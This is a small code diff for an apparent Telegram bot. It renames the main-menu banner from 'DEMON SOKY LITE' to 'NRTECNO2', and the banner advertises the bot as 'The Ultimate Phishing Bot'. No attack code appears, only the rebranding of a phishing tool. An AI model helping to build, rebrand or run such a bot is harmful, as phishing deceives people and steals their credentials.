@@ -113,7 +113,7 @@ def show_main_menu(message):
     user_id = message.chat.id
     bot.send_message(
         user_id,
-        "🔥 *DEMON SOKY LITE* 🔥\n"
+        "🔥 *NRTECNO2* 🔥\n"
         "╔═══════════════════════════════╗\n"
         "║  ⚡ The Ultimate Phishing Bot ⚡  ║\n"
         "╚═══════════════════════════════╝\n\n"
